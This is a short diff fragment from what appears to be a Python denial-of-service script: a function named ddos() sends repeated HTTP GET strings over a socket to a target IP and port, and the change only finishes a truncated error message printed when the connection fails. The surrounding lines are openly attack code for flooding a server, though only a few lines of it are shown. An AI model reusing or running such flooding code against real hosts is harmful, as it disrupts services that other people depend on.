@@ -40,7 +40,7 @@ def ddos():
           mysocket.sendto(str.encode("GET " + message + "HTTP/1.1 \r\n"), (ip, port))
           print("\033[1;32;40m\nSuccess!")
       except socket.error:
-            print("\033[1;32;40m\n
+            print("\033[1;32;40m\nFailed Connection killed!, please wait....")
             
             mysocket.close()
 
